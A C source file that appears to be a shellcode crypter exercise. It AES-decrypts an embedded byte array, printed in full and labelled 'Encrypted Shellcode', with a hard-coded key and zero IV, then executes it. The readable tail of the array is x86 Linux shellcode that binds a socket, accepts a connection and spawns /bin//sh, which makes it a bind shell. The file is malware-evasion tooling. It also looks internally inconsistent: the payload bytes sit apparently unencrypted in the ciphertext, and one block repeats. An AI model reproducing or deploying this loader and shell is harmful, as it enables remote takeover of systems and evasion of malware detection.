#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include"openssl/aes.h"

main()
{
    /* Settting Key and Buffers */
    unsigned char key[16];
    strcpy((char *) key,"012345678912345");
    unsigned char iv[AES_BLOCK_SIZE];
    memset(iv, 0x00, AES_BLOCK_SIZE);

    /* Encrypted Shellcode */
    unsigned char ciphertext[] = \
"\xe5\x14\xde\xb3\x5d\xdd\x29\xa0\x9\x6\x1c\xe1\xd7\x5\xb9\x9b\xef\x8c\x3e\xc2\x58\x4c\x72\xc\x21\x57\x66\x30\x2f\x41\x35\xda\xfa\x3b\xbd\xbd\x9\xe9\xd4\x66\xc1\x21\x37\x58\x9b\x7c\x26\x17\xd5\x83\x9\x99\x30\xf4\xb9\xd0\x45\x17\xa2\x15\x85\x48\xa6\xdb\x1b\x3\xf4\xf1\x5\xf6\xf9\x9a\x8c\x4\x7f\x76\x7b\x36\xb3\x74\xaf\xa4\x1\x88\x5\xe6\x18\xab\xe4\x1c\xb0\xd0\xed\x37\xb\x98\xee\xe6\xba\x78\x4f\x7d\x4d\xf\xfb\xab\x5d\xf6\x50\x8f\x8\xbd\xee\xe6\xba\x78\x4f\x7d\x4d\xf\xfb\xab\x5d\xf6\x50\x8f\x8\xbd\x31\xdb\xf7\xe3\xb0\x66\xb3\x1\x52\x53\x6a\x2\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x43\x52\x66\x68\x82\x35\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x4\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x5\x52\x52\x56\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x2\xb0\x3f\xcd\x80\x49\x79\xf9\x92\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\xb\xcd\x80";


    /* Decryption */
    unsigned char shellcode[sizeof(ciphertext)];
    AES_KEY dec_key;
    memset(iv, 0x00, AES_BLOCK_SIZE); 
    AES_set_decrypt_key(key, sizeof(key)*8, &dec_key); // Size of key is in bits
    AES_cbc_encrypt(ciphertext, shellcode, sizeof(ciphertext), &dec_key, iv, AES_DECRYPT);

    printf("[*] Shellcode Length:  %d\n", strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;

	ret();

}
